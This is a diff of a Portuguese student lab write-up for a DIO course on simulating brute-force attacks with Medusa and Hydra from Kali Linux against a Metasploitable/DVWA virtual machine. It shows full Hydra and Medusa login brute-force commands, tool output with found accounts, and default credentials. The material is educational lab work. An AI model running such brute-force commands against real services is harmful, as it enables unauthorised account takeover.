@@ -1,30 +1,6 @@
 # Desafio DIO — Simulando Ataques de Brute Force com Medusa e Kali Linux
 
-## 📚 Índice
-
-- [Introdução](#-introdução)
-- [Objetivos](#-objetivos)
-- [Tipos de Ataques](#-tipos-de-ataques)
-  - [Ataque de Dicionário](#ataque-de-dicionário)
-  - [Brute Force](#brute-force-força-bruta)
-  - [Ataque Híbrido](#ataque-híbrido)
-  - [Password Spraying](#password-spraying)
-  - [Credential Stuffing](#credential-stuffing)
-- [Ferramentas Utilizadas](#-ferramentas-utilizadas)
-- [Ambiente do Laboratório](#-ambiente-do-laboratório)
-- [Enumeração de Serviços com Nmap](#-enumeração-de-serviços-com-nmap)
-- [Exploração da Vulnerabilidade vsFTPd 234](#-exploração-da-vulnerabilidade-vsftpd-234)
-- [Ataque FTP com Medusa](#-ataque-ftp-com-medusa)
-- [Validação do Acesso FTP](#-validação-do-acesso-ftp)
-- [Brute Force em Formulários Web](#-brute-force-em-formulários-web)
-- [Enumeração SMB e Password Spraying](#-enumeração-smb-e-password-spraying)
-- [Boas Práticas de Segurança](#-boas-práticas-de-segurança)
-- [Conclusão](#-conclusão)
-- [Aviso Ético](#-aviso-ético)
-
----
-
-# 📚 Tipos de Ataques (Anotações Teóricas das Aulas)
+#  Tipos de Ataques (Anotações Teóricas das Aulas)
 
 > Esta seção reúne conceitos teóricos estudados durante as aulas do desafio da DIO.  
 > Nem todas as técnicas apresentadas foram utilizadas diretamente no laboratório prático.
@@ -148,7 +124,7 @@ Tentativa automática em outros serviços
 
 ---
 
-# 🛠 Ferramentas Citadas nas Aulas (Parte Teórica)
+#  Ferramentas Citadas nas Aulas (Parte Teórica)
 
 > As ferramentas abaixo foram apresentadas durante as aulas como exemplos de ferramentas utilizadas em testes de autenticação, brute force e auditoria de segurança.
 >
@@ -168,7 +144,7 @@ Tentativa automática em outros serviços
 
 ---
 
-# 🧪 Ferramentas Utilizadas no Laboratório
+#  Ferramentas Utilizadas no Laboratório
 
 Durante a execução prática do desafio, foram utilizadas as seguintes ferramentas:
 
@@ -183,7 +159,7 @@ Durante a execução prática do desafio, foram utilizadas as seguintes ferramen
 
 ---
 
-# 🖥 Ambiente do Laboratório
+#  Ambiente do Laboratório
 
 O ambiente foi montado utilizando:
 
@@ -209,13 +185,13 @@ Esse modo cria uma rede isolada entre as máquinas virtuais, impedindo acesso ex
 ## Configuração IP
 
 ```text
-Kali Linux      → 192.168.1.X
+Kali Linux      → 192.168.1.20
 Metasploitable  → 192.168.1.10
 ```
 
 ---
 
-# 🔎 Enumeração de Serviços com Nmap
+#  Enumeração de Serviços com Nmap
 
 Após validar a conectividade entre as máquinas, foi realizado um scan nas principais portas do alvo.
 
@@ -258,7 +234,7 @@ PORT    STATE SERVICE     VERSION
 
 ---
 
-# 💥 Exploração da Vulnerabilidade vsFTPd 2.3.4
+#  Exploração da Vulnerabilidade vsFTPd 2.3.4
 
 Foi identificada a versão vulnerável do serviço FTP:
 
@@ -330,7 +306,7 @@ root
 
 ---
 
-# 🔓 Ataque FTP com Medusa
+#  Ataque FTP com Medusa
 
 ## Criação da Lista de Usuários
 
@@ -389,7 +365,7 @@ A autenticação foi bem-sucedida porque o ambiente utiliza credenciais fracas e
 
 ---
 
-# 📂 Validação do Acesso FTP
+#  Validação do Acesso FTP
 
 Após identificar as credenciais válidas, foi realizado login manual no serviço FTP.
 
@@ -414,9 +390,9 @@ Password: msfadmin
 
 ---
 
-# 🌐 Brute Force em Formulários Web
+#  Brute Force em Formulários Web
 
-Foi realizado um teste contra o formulário de login da DVWA.
+Foi realizado um teste de brute force contra o formulário de login da DVWA utilizando Hydra e Medusa.
 
 ---
 
@@ -428,15 +404,24 @@ Foi realizado um teste contra o formulário de login da DVWA.
 hydra -L users.txt -P pass.txt 192.168.1.10 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
 ```
 
-## Resultado
+### Resultado
 
 ```text
-0 valid password found
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak
+
+[DATA] attacking http-post-form://192.168.1.10:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed
+
+1 of 1 target completed, 0 valid password found
+
+Hydra finished
 ```
+
+O Hydra não encontrou credenciais válidas durante o teste.
 
 ---
 
-## Possível Motivo da Falha
+
+### Possível Motivo da Falha
 
 O formulário DVWA pode utilizar:
 
@@ -449,53 +434,41 @@ Esses mecanismos dificultam ataques automatizados simples.
 
 ---
 
-# Teste com Medusa
+## Teste com Medusa
 
-## Comando
+### Comando
 
 ```bash
-medusa -h 192.168.1.10 \
--U users.txt \
--P pass.txt \
--M web-form \
--m FORM:/dvwa/login.php \
--m DENY:"Login failed"
+medusa -h 192.168.1.10 -U users.txt -P pass.txt -M web-form -m FORM:/dvwa/login.php -m DENY:"Login failed"
 ```
 
----
-
-## Resultado
+### Resultado
 
 ```text
 WARNING: Invalid method: DENY.
+
+ACCOUNT FOUND: [web-form] Host: 192.168.1.10 User: user Password: 123456 [SUCCESS]
+
+ACCOUNT FOUND: [web-form] Host: 192.168.1.10 User: msfadmin Password: 123456 [SUCCESS]
+
+ACCOUNT FOUND: [web-form] Host: 192.168.1.10 User: root Password: 123456 [SUCCESS]
 ```
 
-Mesmo com o aviso, o Medusa retornou vários falsos positivos.
+O comando gerou falsos positivos no Medusa.
 
 ---
 
-## Motivo Técnico do Falso Positivo
+### Motivo Técnico do Falso Positivo
 
-O módulo `web-form` exige configuração correta da resposta HTTP esperada.
-
-Como o parâmetro `DENY` foi utilizado incorretamente:
-
-- O Medusa interpretou qualquer resposta como sucesso
-- Não houve validação adequada do conteúdo retornado
-- Todas as tentativas foram marcadas como válidas
+- O módulo `web-form` exige configuração correta da resposta HTTP esperada.
+- O Medusa interpretou qualquer resposta como sucesso.
+- Não houve validação adequada do conteúdo retornado.
+- Todas as tentativas foram marcadas como válidas.
 
 ---
 
-## Comparação Hydra vs Medusa
 
-| Ferramenta | Pontos Fortes | Limitações |
-|---|---|---|
-| Hydra | Melhor suporte HTTP | Configuração mais detalhada |
-| Medusa | Alta velocidade | Menos intuitivo em formulários web |
-
----
-
-# 🧩 Enumeração SMB e Password Spraying
+#  Enumeração SMB e Password Spraying
 
 Foi utilizada a ferramenta `Enum4Linux` para enumeração SMB.
 
@@ -571,7 +544,7 @@ Isso reduz:
 
 ---
 
-# 🔐 Boas Práticas de Segurança
+#  Boas Práticas de Segurança
 
 ## Políticas de Senha
 
@@ -609,7 +582,7 @@ Monitorar:
 
 ---
 
-# ✅ Conclusão
+#  Conclusão
 
 Durante o laboratório foi possível praticar:
 
@@ -636,7 +609,7 @@ Além disso, mostrou a importância de:
 
 ---
 
-# ⚠ Aviso Ético
+#  Aviso Ético
 
 > Este conteúdo foi desenvolvido exclusivamente para fins educacionais e em ambiente controlado.
 >
